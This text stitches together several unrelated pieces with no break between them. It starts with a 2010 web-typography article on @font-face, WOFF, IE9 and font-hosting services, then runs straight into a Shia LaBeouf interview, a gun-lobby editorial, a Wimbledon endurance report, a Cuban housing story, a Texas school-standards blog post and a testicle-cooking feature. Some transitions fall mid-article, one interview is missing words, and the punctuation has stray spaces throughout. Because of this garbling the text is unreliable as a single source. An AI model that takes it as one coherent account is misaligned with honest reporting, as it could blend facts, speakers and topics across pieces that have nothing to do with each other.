Starting in 1998 with Internet Explorer 4 , and then from March 2008 through March of 2010 , one by one , all of the “ big five ” desktop browsers — Safari , Firefox , Opera , and Chrome — have rolled out roughly comparable implementations of @font - face font linking .
With these , an indispensable piece of the web publishing puzzle — a piece missing since the web began — has fallen into place , and a true web - specific typography can begin to take shape .
Article Continues Below
First , a roundup of recent events :
Let ’s take them one at a time …
WOFF was formally submitted to the W3C Fonts Working Group on April , 8 , 2010 .
Unexpectedly , Microsoft co-sponsored the submission along with Opera and Mozilla and support for WOFF is featured in developer preview builds of IE9 .
WOFF will be the standard “ transport format ”  for fonts .
It ’s already in Firefox 3.6 + , and the makers of Chrome have announced that it , too , will soon support WOFF .
Now , WOFF , unfortunately , has been hyped in ways that can mislead .
So let ’s stop a moment because it ’s important to know what WOFF is and , just as importantly , what it is n’t .
Like its older cousin , EOT ( Embedded Open Type ) a WOFF file is , essentially , a zipped font file .
It is not a font format in and of itself .
It ’s a font file that ’s been packed up to travel .
As PNG and JPEG are to image formats like BMP and TIFF , WOFF is to TTF and OTF .
( Except that , unlike a compressed image , the original font can and must be extractable from the compressed file . )
In practice , WOFF and EOT are very similar and the compression ratios are about the same .
WOFF is not a magic font format that will once and forever break down all the barriers that have stood in the way of licenses for commercial fonts .
No , font producers ’ fears about the web are much more complex than that — and we ’ll examine them shortly in connection with FHOS .
IE9 and DirectWrite#section3
IE9 uses Windows ’s DirectWrite rendering API .
If you have n’t downloaded the IE9 preview I suggest you try to do so , it might cheer you up .
If you spend any time at all with it , you wo n’t want to go back to IE8 and / or XP .
( Mac users , no guffaws , please . )
The font rendering in IE9 is worlds apart from what we ’ve all come to expect .
It ’s certainly on a par with the Mac and in some ways arguably better .
But whatever your personal opinion , at least the difference boils down largely to a matter of taste .
One of the great side - effects of the focus on web fonts was the spotlight on just how wanting font rendering in browsers running on Windows had become in comparison to browsers on OS X .
Note also that DirectWrite is a Windows API , not specific to IE , and other browsers like Firefox will be implementing it as well .
IE9 and @ Font - Face the CSS3 Way#section4
What makes @font - face a viable cross - browser proposition now , today , is that — amazingly — IE has supported @font - face for over ten years .
However , IE9 will be the first implementation of @font - face as described in CSS3 .
The main changes are these :
Font Formats#section5
In addition to TrueType ( TTF ) fonts , IE9 will support PostScript - flavored OTF CFF fonts , as do the rest of the “ big five ” browsers .
Now , removing this barrier to interopability is a good thing , but a word of caution is in order :
If only in the interest of backward compatibility with IE 6 –8 , it will be some years before web fonts can stop being predominantly TrueType .
IE 6 –8 will only accept a TrueType font packaged as an EOT .
And there are rendering issues to consider in other Windows browsers , as well .
Hopefully , font designers will help out by making their fonts available in TrueType with adequate TrueType hinting .
Unless , as one type designer quite seriously suggested to me , everyone should just hold off on web fonts for however long it ’s going to take for IE8 to fall off the map .
Hah !
Too late .
Within an @font - face “ declaration ” in CSS3 , you , as a web author , get to do what the operating system does for you with the web - safe fonts .
You get to group fonts into font - families by “ declaring ” them with the same font - family name .
You get to differentiate members of that family by “ declaring ” each to be a differing combination of font - style ( normal , italic ) and font - weight ( normal , bold ) .
Be aware that the terms font - weight and font - style have different meanings inside the @font - face declaration than they do outside the declaration in the main CSS rulesets .
Inside the declaration , “ font - weight : bold ” means , “ this is the bold member of this font - family ; ” outside the declaration “ font - weight : bold ” means , “ apply bold to this text by using the member of this font - family that was declared as bold . ”
In IE6 –8 @font - face works the same way .
However , in order for EOT files to work right , some of the naming and descriptive data within the TTF file from which the EOT is made needs to match up with the CSS declaration .
Most of the time there ’s no problem .
But once in awhile certain fields inside the font ’s data tables need modification .
Should that happen , the issues are fully known and easy to fix .
( The docs for EOTFAST have details . )
Tools for Web Fonts#section7
The essential tools web authors need have emerged :
The Font Squirrel Generator#section8
The Generator is a suite of online tools offering conversion , subsetting , CSS generation , and more .
At the moment , it ’s simply head and shoulders above anything else available on the web and , in the hands of font designer and web developer Ethan Dunham , it continues to evolve .
Also , you might want to familiarize yourself with some of the following free tools being used behind the curtain at places like Font Squirrel , Kernest , and Google :
FontForge is a full - featured font editor with all sorts of scriptable server - side goodies .
It ’s also open source .
sfnt2 woff is a suite of open source tools for packing TTF and OTF CFF fonts into WOFF files .
ttf2eot is a precursor to EOTFAST .
It creates uncompressed EOT “ lite ” files .
TTX is a tool to convert OpenType and TrueType fonts to and from XML .
Fontue is an open source engine for serving fonts plus font - processing scripts , too .
Contributions welcome on Github .
WebFont Loader is a JavaScript library that gives you more control over font loading than the Google Font API provides .
It was co-developed by Google and TypeKit .
Developed by myself and Philip Taylor of Cambridge UK , EOTFAST is a free , easy - to - use alternative to Microsoft ’s nightmarish TTF - to - EOT conversion tool , WEFT .
Use EOTFAST to create natively compressed EOT files for compatibility and quicker page load in IE 6 –8 .
Note also that the EOT format has not been deprecated and will continue to work in all rendering modes of IE9 , making it a handy way of targeting all versions of IE without resorting to conditional comments .
Trusting Licenses#section10
Trusting licenses — fonts at volume prices that provide both installable TTF or OTF files for ease of development as well as files for posting on web servers — are available from Font Spring .
And the site provides — as every web font vending site must — an in - browser specimen sheet of the font so you can see what you ’re really getting before you buy .
Hopefully , other shops will adopt this simple licensing model .
Font Hosting And Obfuscation Services ( FHOS ) #section11
Until @font - face , browsers relied on the underlying operating system for fonts , so unlicensed use in web pages was never an issue .
The OS acted as not only a technological , but a legal conduit as well .
Rights to use the web safe fonts came with the operating system .
But @font - face bypasses the OS and , instead , the fonts come from web servers .
This presents commercial font producers with the prospect of great loss of control and a completely new set of legal realities .
It also brings the prospect of a huge new market , but within the font industry it ’s fair to say there has been less excitement about that than there has been wariness about the potential loss of control .
The web market is an unknown , the print market is established .
The conflict of new media versus old media is playing out once again , this time with fonts .
The concerns of commercial font producers go much deeper than the scenario of some visitor to a site seeing a font they like , digging into the CSS , and downloading it .
Let me offer the following explanation so you can better understand why font services that employ obfuscation and , in some cases , rather long , obtuse , and grumbly licensing agreements , exist .
Font producers have seen what happened to the music , book , newspaper , magazine , and stock photo industries and they are afraid that the same thing is now about to happen to them .
It ’s been called the iTunes Effect , and it ’s about price .
Font designers are very still very much focused on print .
By and large , the money is in catering to professional customers in the printing industries :
Books , magazines , displays , etc .
Prices usually move on a sliding scale based on the number of users .
The fear is that once fonts are on the web , they will become a commodity , the current model will break , and a devaluation of fonts , in general , will occur .
The fear is that font designers will no longer be able to charge a print customer , say , $ 420 for a four style font family with a 6 – 10 user license in a world where fonts are being delivered on websites to virtually unlimited numbers of “ users ” who do n’t have to pay anything at all .
What if the web drives down prices in the print sector and does n’t generate much revenue on it ’s own ?
Buyer Beware#section12
In response to this “ Internet Threat , ” some commercial font design houses have opted for font hosting and obfuscation services ( FHOS ) .
These services use , essentially , the Amazon Kindle model but instead of books you get what books are made with : Typefaces .
Fonts are doled out in a measured and controlled way so the font creators know where each one is going and how it ’s being used .
The obfuscation focuses on preventing casual download and making the font uninstallable in the OS and therefore unavailable to print layout programs like InDesign .
For these services , keeping the font file firmly in hand is the prime directive .
Growing out of discussions between representatives of font producers like Microsoft , Adobe , Monotype Imaging , and others in the wake of Typekit ’s appearance last year , the past few months have brought FHOS offerings from Microsoft ’s font distribution proxy , Ascender Corp , Extensis ( specialists in font - management and licensing management software ) , Monotype Imaging , and a collective including David Berlow ’s Font Bureau .
I can tell you that the folks at Extensis , Ascender , and Monotype are genuinely happy and enthusiastic about providing fonts for the web .
But certainly they wo n’t be quick to point out that the delivery system for those fonts is crafted within the constraints of a clever but hacky DRM - like structure .
This is understandable .
But attempts to identify and prevent instances of unlicensed distribution through code have proved counter - productive for just about everybody and it ’s hard not to view obfuscation as futile and irrelevant in the long term .
Font designer Ray Larabie said it best :
Protecting fonts from being installable in an OS will seem quaint and silly in a decade when using fonts for something other than the web will be a rarity .
Install fonts on your OS ?
Whatever , grandpa !
In the near future , nobody will even want to install a font on an OS .
Buyer Be Thankful#section13
But then again , there ’s a flip side .
You can view FHOS as a phase .
Services are innovating .
For example , the WebINK service from Extensis features a free installable “ preview wizard ” of sorts called Type Drawer that enables you , among other things , to instantly swap selected fonts on your page with drag and drop simplicity .
This can be a huge time saver and it is certainly the kind of authoring tool designers need .
Right now it ’s proprietary to the WebINK service , but still it helps in shaping things to come .
A Checklist For Font Services#section14
Personally , my focus is on providing information for do - it - yourselfers .
And as a web author , now that I do n’t have to rely on the OS for fonts except for fallback , I ’m uncomfortable with the idea of having an outside entity in control of something as basic and fundamental to the design of my site as a typeface .
Further , every independent web designer I ’ve spoken to about it has said they simply would not , under any circumstances , saddle a client with an ongoing expense for fonts .
Thousands of free fonts are available , and many of them are of as high quality or higher than those offered by the services .
Certainly you should know , at the very least , what the technical differences are between what the service does and what you could do if you hosted the files yourself .
Influenced by the checklist recently proposed by the EFF in connection with the explosion of digital books , here ’s a kind of consumer checklist for those considering FHOS :
Exactly what inefficiencies are being introduced in the effort to prevent visitors to your site from downloading and installing the font in the OS ?
And how many additional http requests are being made as a result ?
Has caching been disabled ?
Will users be subject to a Flash Of Unstyled Text ( FOUT ) with each session ?
If font file splitting is being utilized as an obfuscation technique , how might it effect things like spacing and kerning ?
And does the file splitting increase the likelihood of failure in some browsers ?
Is the service truly “ standards compliant ” in that it allows you to use the CSS3 standard in its full breadth and scope as it is currently implemented by those browsers that support @font - face ?
Is the End User License Agreement or Terms of Service understandable ?
As a business contract , are you comfortable obligating yourself or a client to its provisions ?
If you stop using the service and begin to host your own fonts , can the agreement conceivably compromise you in any way ?
What is the privacy policy ?
Is the activity on your site being monitored and logged and if so , how ?
And what is done with that information ?
Do the terms of the contract define the rights of visitors to your site ?
As your “ users , ” are visitors licensed to use the font not only for onscreen display , but for printing and the creation of PDFs , as well ?
Are visitors who attempt to download the font files individually exposed to any risks under the DMCA ?
( Let ’s face it , we all deconstruct and examine parts of other people ’s sites .
That ’s the web . )
Once WOFF ( and EOT ) support is ubiquitous , is there a path to self - hosting or will you forever be locked in to the service ?
Comments , please .
Advanced Features Of OpenType#section15
With Mozilla ’s John Daggett taking the lead as author of the CSS3 Fonts Module , an impressive team of “ invited ” type design experts are doing the hard work of thinking through the problems of advanced typography at the W3C .
In the near term , this can have a big impact on the display of mathematical symbols and non-latin languages .
The Future Of Flash Text Replacement#section16
It ’s been years now and Flash still is n’t allowed on the iPhone .
It ’s forbidden on the iPad .
Steve Jobs ’s recent pronouncement has gotten a lot of attention and it ’s very hard to see Apple backing away from this decision .
Plus , the iPhone and iPad both support a much simpler and elegant @font - face alternative to font rendering using the SVG format .
For any developer contemplating a new project , it ’s hard to see how sIFR makes any sense .
@ Font - face presents a lower learning curve and it does n’t need to have a future , it is the future .
Google Hosts Fonts#section17
In a suprise development that grew out of informal talks with the folks at Typekit , Google has become a provider of openly licensed fonts via the Google Ajax API ’s .
It ’s been set up as an open source project and you ’ll find documentation , examples , and information on how to contribute at its GitHub repository .
Unlike a lot of open source projects , this effort has a full time curator in Raph Levien .
Interestingly , in spite of the fact that fonts are quite often the product of teams , some knowledgeable observers assert that fonts defy open source collaboration .
Well , we ’ll see .
Making It Work Today#section18
All together now , let ’s get really confused : for IE 6 – 8 you can only use TTF fonts wrapped up as EOT or EOT “ Lite ” ( uncompressed ) .
For Firefox , Opera , Chrome , and Safari , you can deliver TTF or OTF files either “ raw ” or , in some cases , wrapped up as WOFF files or as data URI ’s inside a stylesheet .
SVG will surely be a major font format going forward but its main virtue today is support in Mobile Safari for the iPhone and iPad .
Got that ?
Yes it is confusing .
At first .
Major changes always are .
But I expect that web authors will do what web authors have always done :
Find a way to make it work .
The raw materials are there .
The tools are there .
The workarounds are there .
So put together some sample pages and templates , and prepare for the crossing .
The time has arrived .
" I feel like I dropped the ball on the legacy that people loved and cherished , " LaBeouf said , explaining that this upped the ante for him before he began shooting the " Wall Street " sequel .
" If I was going to do it twice , my career was over .
So this was fight - or - flight for me .
" Meeting with reporters Saturday on a terrace at the Hotel du Cap , he had some strong , confessional words about his acting in the film , which he said he felt did n't convince anyone that he was the action hero the movie claimed him to be .
" You get to monkey - swinging and things like that and you can blame it on the writer and you can blame it on Steven [ Spielberg , who directed ] .
But the actor 's job is to make it come alive and make it work , and I could n't do it .
So that 's my fault .
Simple . "
The last time Shia LaBeouf came to Cannes , in 2008 , it was to promote " Indiana Jones and the Kingdom of the Crystal Skull , " the revival of the swashbuckling adventure franchise that went on to earn a whopping $ 787 million around the world .
LaBeouf is back on the Croisette this weekend to flog " Wall Street : Money Never Sleeps , " another revival of a classic from several decades ago .
But he 's not willing to forget about what he says were rampant problems with Indy 4 -- and he does n't expect fans to , either .
think the film had fooled anyone .
" I think the audience is pretty intelligent .
I think they know when you 've made ... .
And I think if you do n't acknowledge it , then why do they trust you the next time you 're promoting a movie . "
LaBeouf went on to say he was n't the only star on the film who felt that way .
" We [ Harrison Ford and LaBeouf ] had major discussions .
He was n't happy with it either .
Look , the movie could have been updated .
There was a reason it was n't universally accepted . "
LaBeouf added , " We need to be able to satiate the appetite , " he said .
" I think we just misinterpreted what we were trying to satiate . "
Asked whether this was difficult to say , given his deep relationship with Spielberg , LaBeouf continued with the directness .
" I 'll probably get a call .
But he needs to hear this .
I love him .
I love Steven .
I have a relationship with Steven that supersedes our business work .
And believe me , I talk to him often enough to know that I 'm not out of line .
And I would never disrespect the man .
I think he 's a genius , and he 's given me my whole life .
He 's done so much great work that there 's no need for him to feel vulnerable about one film .
But when you drop the ball you drop the ball . "
Interviewing LaBeouf is a unique experience .
It 's nearly impossible not to like the 23 - year - old , who carries an honesty and a winning sincerity that endears him to you despite , or because of , his mispronunciation of words such as " schoolastic " and " hyperboil " ( as though the word for exaggeration connotes a manic skin blemish ) .
He 's refreshingly honest , apparently engaged with subjects far beyond movies and willing to throw out whatever playbook his publicists no doubt beg him to use .
He 's also relentlessly intense and unfailingly earnest , taking every question hyper-seriously .
When asked whether shooting " Wall Street : Money Never Sleeps " gave him some insight on what was wrong with our financial system , he said this , with exactly no interruptions :
" You can make the marketplace more transparent .
If people had known who was paying for the mortgages instead of having to rely on Moody 's triple - A ( bull ) rating -- transparency would have helped .
The triple A rating thing is ridiculous .
That 's like Oliver [ Stone ] paying you for a review .
The people who were bundling this toxic crap were paying Moody 's for the review of their crap .
That 's ridiculous .
You can't have bank holding companies acting as hedge funds .
You can't have them taking a million - dollar pension plan for Joe Schmo the bus driver and treat it with the same risk appetite that you treat George Soros ' pocket money .
It 's fundamentally ridiculous .
And it has n't gotten better very recently , actually .
They went from bundling mortgages that were crap to bundling life insurance policies and betting on people 's deaths .
And you can't blame it all on the Street ....
People 's mentality needs to change .
If the Greece contagion thing takes off and it goes from Spain to Ireland to Portugal things are going to change drastically for the world .
Soup kitchens , it wo n't be that type of change .
You wo n't get a depression that way .
But it 'll be very difficult .
I think , my generation , it 's hard to have hope when you got a $ 700 - trillion derivatives debt to pay and a bubble about to explode and $ 500 trillion worth of GDP .
You took all the money in the world and put it in a pot , you 're $ 200 trillion short .
It 's scary , man .
You know the average person born today owes $ 8,000 ?
The average person getting out of college owes $ 75,000 with no job .
I mean it 's scary .
My generation , it 's a scary situation .
" If only some of that energy had come through in the last Indiana Jones .

While the rest of the nation comes to grips with fresh concerns about terrorism , domestic and foreign , Congress is wrapped up in the peculiar obsessions of the gun lobby  most of which are certain to make Americans less safe in their homes and on the streets .
Congress , for example , is cowering before the gun lobby insistence that even terrorist suspects who are placed on the “ no - fly list ” must not be denied the right to buy and bear arms .
Suspects on that list purchased more than 1,100 weapons in the last six years , but Congress has never summoned the gumption to stop this trade in the name of public safety and political sanity .
Legislation to close this glaring threat continues to languish with little promise of enactment because a bipartisan mass of lawmakers fear retribution by the gun lobby ’s campaign machine .
Firsthand pleas this week from New York City ’s mayor and police commissioner  testifying after the attempted Times Square bombing attributed to a suspect who was also carrying a legally obtained gun  showed no sign of budging a timorous Congress .
It is a sign of the gun lobby ’s growing confidence that if feels free to keep up the pressure , public and private , after the near - disaster in New York .
Normally , the lobby goes quiet for a decent interval after a particularly heinous crime occurs .
Image caption John Isner reached a record - breaking 59 - 59 deadlock with Nicolas Mahut
From the Tour de France to ironman triathlons , impressive feats of human endurance are not uncommon in sporting circles but they are not usually associated with tennis .
Yet after Wednesday 's record - breaking game at Wimbledon , it is fair to say that the US's John Isner and France 's Nicolas Mahut have changed that perception somewhat .
They will resume the 10 - hour match today after ending locked at 59 - 59 last night .
The question is , what will the battle have done to them physically and mentally and will it have any long - term impact on their career ?
Physical limits
Professor John Brewer , head of applied sport and exercise science at the University of Bedfordshire , agrees it was a truly amazing event and both players deserve the highest praise for their tenacity .
" Both of them are a credit to the fitness of modern tennis players .
This has never been seen before . "
It is fair to say that , even for players at the top of their game who are used to playing many days in a row for long periods , yesterday 's match will have pushed them to their limits .
In terms of energy needs , the average tennis player will burn around 10 to 15 calories a minute , so even taking into account the intermittent nature of the game , they will have burnt at least 6,000 calories over the course of the match .
If it becomes another long game , clearly it will be more difficult to recover before the next round but bear in mind they are used to playing day after day Professor John Brewer , University of Bedfordshire
Initially their bodies will have been using " carbohydrate " energy in the form of glycogen stored in the muscles but this would soon have been depleted , says Professor Brewer .
" For high intensity exercise you would normally only have enough for about two hours so then they would have had to rely on their fat stores .
Even lean players will have enough to allow them to continue but it will be at a much lower level . "
Running out of energy is not just a physical problem as a drop in blood sugar levels can also affect mental performance - hindering decision - making .
" The other challenge is dehydration as they would lose about one to two litres of fluid an hour and we know that , if a tennis player loses 2 % of their body weight through fluid loss , their mental and physical performance will suffer , " he says .
Recovery
But these are world - class athletes , they know what to eat and drink and how best to recover , so will such a demanding game have any long - term effect ?
Barring any injury , the answer to that is probably not , says Professor Brewer , but that may depend on how long today 's match lasts .
" If it becomes another long game clearly it will be more difficult to recover before the next round but bear in mind they are used to playing day after day . "
What is clear is that with fatigue comes a heightened risk of injury as players become less co-ordinated , potentially putting more strain on muscles and ligaments .
Dr David Fletcher , lecturer in sports and performance psychology at Loughborough University says a 10 - hour match will put a lot of demands , stresses and pressures on an athlete , not least of which are the mental pressures of having to come out and do it all over again in order to complete the game .
Image caption Light finally stopped play on the longest game in Grand Slam history
" This will be outside their comfort zone .
It will be a real test of mental resilience .
" A big factor on the outcome of the game will be how well they recovered and prepared this morning and they will need to stay focused on the things they can control . "
Dr Fletcher adds that too much thought given to how long today 's game may be will cause the players to " take their eye off the ball " .
" They 'll be taking their time between points , making sure their breathing is right and they need to make sure they stay relaxed so they do n't waste any energy . "
Havana , Cuba ( CNN ) --
" We never imagined having a house like this , " says Eric Martinez as he walks through the three small bedrooms with their flowered quilts and family pictures .
The walls are freshly painted and pink curtains hang in the windows .
" When the hurricane came through it left nothing , nothing at all , " he says .
" It was n't just one house that was destroyed , it was a bunch . "
Hurricane Gustav slammed into the Cuban coastal town of Los Palacios in August , 2008 , a dangerous category 4 storm .
It damaged 84 percent of the homes , many of them made of wood .
Ten days later , Hurricane Ike tore across much of Cuba , dumping torrential rains on Los Palacios .
And then in November , Paloma struck the island .
The government put the combined damage at $ 10 billion .
Now , a unique program helps victims like Martinez re-build their lives -- and their homes .
" Here , nobody imagined we would recover so quickly .
And when you build for yourself , you feel good , " said Martinez .
New houses have gone up all along the hurricane corridor in the western province of Pinar del Rio .
Many of them are made entirely or partly of " eco-materials " -- local resources turned into construction materials at a low cost -- and all done in the community .
The project is the brainchild of Cuba 's CIDEM research and development institute .
" In a context where energy is very expensive ... and where resources are expensive and the environment is being destroyed , you have to look for local solutions " explained CIDEM director Fernando Martirena .
After hurricanes , floods and earthquakes , CIDEM moves in quickly to set up mini-factories using its own low - tech machinery .
" Usually in the aftermath of a disaster , the choice is whether you have tents or one of these workshops , " Martirena says .
" We choose to develop technologies so you can come soon after the disaster , organize the local population and produce the materials for real , lasting houses . "
In Los Palacios , CIDEM set up a mini- factory last year .
Five workers operate a simple contraption that uses vibrations to turn out blocks made from local gravel , sand and cement .
" This machine has the capacity to produce 1,200 blocks a day -- that 's equivalent to a house , " regional manager Jose Miguel Capote explains .
Row upon row of the bricks dry in the sun before families pick them up to start re-construction -- usually only a few blocks away .
Across the mountains , a similar workshop churns out bricks in the northern coastal town of Bahia Honda .
On a nearby residential street , Rene Garcia , a cafeteria worker , mixes cement and his wife offers juice to one of the professional builders provided by the government .
" Whatever he tells me to do , I do it , " Garcia says of the builder .
" Anything to finish this quickly . "
In Cuba , the government works closely with CIDEM .
They provide professionals to oversee the work and they guarantee hurricane victims paid leave from their jobs in order to rebuild houses .
CIDEM has set up workshops in 18 countries in Latin America , five in Africa and most recently in Asia , with funding primarily from Switzerland and Canada .
" These are labor intensive technologies because they are targeting developing countries where unemployment is a great issue , " Martirena says .
" The environmental impact is about saving energy most of all , " he adds , pointing out that little or no transportation is needed .
The houses cost up to $ 15,000 in Central America , for example .
There , the bill is often picked up by the local government and non-profit organizations .
Mileidy Rodriguez hugs 9 - month - old Adrian as workers slap cement on her front wall .
For now , her house is just a skeleton : a cinder block bathroom , cement kitchen and bedrooms made from wooden planks .
" My house , look how it 's coming , " she says proudly .
" We 'll be living here soon , and probably better than before . "
Rodriguez ' old house was flattened by Gustav while she and her family sought shelter with her mother .
She can barely hold back tears when she talks about it .
" Just imagine , " she says .
" We were left homeless with two children , and a third on the way . "
Many Cuban families are still homeless .
But CIDEM helps ensure those who rebuild have homes that will survive the next hurricane season .
You know , I was going to write up a description of yesterday ’s Texas Board of Education debate over the social studies standards .
But then I figured I ’d just post a video of different excerpts from the hearing and let folks watch for themselves :
The board votes today on the new curriculum standards .
Be afraid .
Be very afraid .
OK .
Here ’s a real video clip of the hearings in which the board discusses whether to keep civil rights and labor leader Dolores Huerta in the standards .
( Favorite quote : “ By definition of history , you should be dead . ” )
* Sigh . * Brawndo ’s Got What Plants Crave .
Dolores Huerta is a socialist .
The critical thinking is the same .
These board members are like Sarah Palin , so unconcerned by their abject ignorance that they cheerfully ramble on , stringing unconnected words together , figuring that if they keep using snippets of the right talking points , they will eventually produce a cohesive insightful point .
( Not unlike the notion that a room full of monkeys banging randomly forever on typewriters will one day produce a Shakespearean sonnet . )
Case in point , during a debate over whether to include Confederate President Jefferson Davis ’ inaugural address alongside the speeches of Abraham Lincoln , Cynthia Dunbar accuses opponents of the motion of trying to “ whitewash ” history .
She heard someone else use it and without a moment ’s reflection to try to grasp what it means to others , she throws the term out there to make what she no doubt thinks is a clever and irrefutable rhetorical point .
( Sort of along the same lines as , “ I know you are , but what am I ? ” )
The Texas Freedom Network has been live blogging the hearings .
Here is the excerpt regarding Jefferson Davis :
7:21 – Lawrence Allen moves to strike a requirement that students study the ideas in Jefferson Davis ’s inaugural address .
A requirement to study the inaugural addresses of President Lincoln and Lincoln ’s Gettysburg Address remains .
Allen notes that Davis ’s address does n’t mention slavery , and the standard currently puts Davis on an equal footing with Lincoln .
7:25 – Barbara Cargill wants to keep Davis ’s inaugural address in the standard .
Dunbar does as well , saying we should n’t “ whitewash ” history .
But that ’s what Davis ’s address does !
The address does n’t even mention the reason southern states seceded : slavery .
7:28 – Bob Craig notes that an earlier standard already included a mention of Davis .
Putting Davis ’s address on an equal footing with Lincoln ’s speeches and ideas is wrong .
Students should analyze the ideas of people who made our country great , not the ideas of those who did n’t , he says .
7:31 – David Bradley argues that some people simply do n’t like what Davis ’s address said .
Well , duh .
Why should students study the disingenuous speech of a secessionist who led states that sought to continue enslaving millions of human beings ?
7:35 – Geraldine “ Tincy ” Miller suggests that Davis ’s address should remain in for balance .
7:35 – The board votes to keep Davis ’s address and then moves the reference to Davis ’s address to after the mention of Lincoln and asks students to “ contrast ” the speeches of the two .
This is absurd .
The ideas in Davis ’s address are focused almost entirely on attacking federal authority — a modern - day TEA Partier could have written such a speech today .
The speech said nothing about the evil institution of slavery that Davis ’s administration supported .
This is just another attempt to whitewash the real history of the Confederacy and the Civil War .
The board is scheduled to vote today on these new standards .
If they approve them ( and there is no reason to assume they wo n’t ) , America will be another step closer to instituting an Idiocracy .
Testicle ...
It 's What 's for Dinner Inside the Achewood Test Kitchen with Acclaimed Cartoonist Chris Onstad
I ARRIVE AT CHRIS ONSTAD'S Northeast Portland home holding a red cooler containing two pounds of ungulate testicles — yak and buffalo , to be exact .
Our plan is to attack these balls with the culinary equivalent of a swift , unexpected kick to the groin .
We 're going to cook like we mean it , and " nut up , " as it were — hopefully emerging with something not simply edible , but downright delicious .
When you 're in Onstad 's kitchen you 've got to come correct , with a certain sense of bravado .
After all , he 's the creator of the beloved internet comic Achewood ; he 's been lauded in Time magazine for writing the " best graphic novel of 2007 , " and has won over the likes of the New Yorker and NPR .
His first book from Dark Horse Comics , The Great Outdoor Fight , has achieved critical acclaim , and he's the author of the self - published The Achewood Cookbook : Recipes for a Lady or a Man , with a second cookbook coming very soon .
I shake hands with the imposing Onstad , whose eyes shine brightly behind his small spectacles — both of us likely thinking about my cargo .
I have the odd feeling that I 'm stepping across the threshold , straight into Onstad 's surreal and unexpected Achewood universe .
But there at the front door , neither of us can know that after four bottles of wine and one bottle of Thunderbird we will have taken our testicles on an unexpected gastronomic journey around the globe — with ample time to stop for fried chicken thighs .
If someone were to step into Onstad 's home unaware of his profession , it 's likely they 'd suspect he was a cook before a cartoonist .
Almost every wall of his modest kitchen is adorned with an array of copper cookware hanging like shiny baubles .
There are pots of all sizes and pans for every purpose .
The man 's got serious gear .
On his living room bookshelf there are food books — be they cookbooks or chef biographies — which appear to outnumber all other texts .
" If we were to cook one recipe from these cookbooks every day for the rest of our lives we'd never get through them , " Onstad says .
" I appreciate how much of cookbookery is just pornography . "
One of the first things we do after a tour of his garden ( " the plan is to plant all of the really expensive vegetables so that you do n't have to buy them " ) is hit that pornography .
He pulls a dog-eared copy of the Larousse Gastronomique off the shelf and searches for testicle preparation , which instructs us to parboil the balls , cool them immediately under water , and peel off the tough outer encasing .
Onstad sets the water to boil .
The fact is Onstad got into cooking long before he was into cartooning , thanks to meeting his wife Liz .
" Up until that point , I 'd only really made quesadillas in college , " he explains .
" She introduced me to risottos and pastas that were n't drowned in meat sauce .
It was something we did together .
We were young and the Food Network was new . "
The water begins to boil as his wife and daughter return home .
Onstad covers the slightly bloody Ziploc bag of testicles with a kitchen towel .
" Are you okay with seeing these ? " he asks .
Though his delightful family is fine with their presence , he decides to segregate the testicles from the good family cookware .
Meanwhile , we notice his dog Olive , a consummate beggar , has not stepped foot in the kitchen .
Animelles en Persillade
" Ooh , the sympathy .
The sympathy .
It 's terrible , " says Onstad as he runs the sharp edge of the carbon steel blade across a parboiled testicle .
The skin splits open and the meat inside purses outward through the gash .
It 's the color and consistency of sea urchin .
It smells like ...
" Smells like spunk ? " Onstad offers .
" Smells like a bad day ? "
In 2001 , Onstad posted his first Achewood strip .
Meanwhile , he was cooking with his wife and expanding his palate .
Before long his career as a cartoonist was taking off .
While his cooking life was n't necessarily injected into the strip , it was n't uncommon for his menagerie of characters to be talking about or making food .
It was an aspect of the strip that began earning him fans in the culinary world .
" What basically happened was that people who like cooking actually started following the strip . "
Onstad says .
" I came to Portland in 2008 to do a signing and cooks were coming in with these strips that had obviously been hung up next to their stations because they smelled like fryolator grease and were discolored . "
The strip he saw most often came from a storyline called the " Badass Games , " wherein some of Achewood 's citizenry compete to discover who 's the manliest .
The first event ?
Baking a loaf of bread from scratch .
" Nothing is more old school than making your own damn staff o' life , " proclaims the black thong - wearing , bespectacled cat named Ray .
" A man who can walk into any kitchen in the world and make bread is COMPLETELY RAW . "
" Write about what you like and the right people will find you , " says Onstad .
And clearly what Onstad likes is cooking .
He works through a clove of garlic — the sound of his knife is like a tap dancer on cocaine .
In no time it 's finely minced and ready to join our first preparation : a basic French ' nad .
" One of the most awesome tricks for dressing up basic meat is a mince of garlic and parsley fried up in butter with shallots , called a persillade . "
Onstad says .
We lack the parsley , yet this does n't stop us from tossing the small chunks of buffalo testicles into a pan with butter , garlic , and shallots .
They 're done in seconds .
We slide the browned pieces onto a plate and pick them up with toothpicks .
" That 's nice , " says Onstad .
" They need a whole lotta love .
Soy sauce would not be out of place ... some nice aromatics .
Oh! Lemon ! "
Soon he 's dressing the plate with lemon and the animelles go from soft , buttery , garlicky , mineral -y morsels to something that would not be out of place in a pricey watercress salad .
" It 's like any protein : salt , pepper , lemon — it 's going to save the day .
It 's definitely not something to be afraid of .
I 'd eat this over liver any day . "
Still his wife notes hues of apprehension on his face .
" I come from really standard American tastes . "
Onstad admits .
" I feel this need to experiment because I feel this need to watch people do it on TV .
When I met Liz 12 years ago , I was n't too big into tomatoes or mushrooms .
I had a really white - bread palate . "
Unhappy Family Jewels
That white - bread palate is evident in his first Achewood cookbook , meant for those cooking well beyond the borders of the local farmers markets and gourmet food emporiums .
" It is n't that ambitious of a book , " Onstad explains .
" It 's like , ' how to make a T - bone steak . '
And the people who are cooking from this book are n't the most exacting of food critics . "
What makes that first book so special , however , is that all of the recipes are written in the voices of Achewood residents .
From the can 't - give - a- shit drunken recklessness of Ray to the continually frustrated and far too giving tone of Téodor , the Achewood cookbook comes off essentially as a really useful and entertaining read .
Onstad is a barnburner of a comic writer , if quite practical in the kitchen .
The French nuts dispatched , he grates ginger , minces more garlic , and chops a jalapeño .
A second testicle — yak this time — is parboiled , peeled , and chopped for the Asian treatment .
" There is nothing more likely to fail than white people cooking Chinese food , " Onstad pronounces sagely .
But he has a trick up his sleeve : velveting , in which cornstarch is used to thicken the texture of a stir - fry sauce .
He heats a touch of oil in a well - seasoned wok and tosses in a handful of peppers .
Smoke hits him full in the face and he begins coughing , managing only to choke out the word " capsaicin . "
Undaunted , the ball meat , soy , ginger , and garlic are thrown into the wok .
It 's all violent sizzle .
Then , calm as the Chinese testes are plated , glistening in thick brown sauce .
We reach for the toothpicks and dig in .
" Like the bottom of a fish tank , " Onstad grimaces , retiring his utensil .
Though I agree , the sauce is too good — especially when we hit the dish with a squeeze of lemon .
I cannot stop putting the testicles in my mouth , and for that I feel the shame of everyone 's favorite prom date .
Ranch Tackle
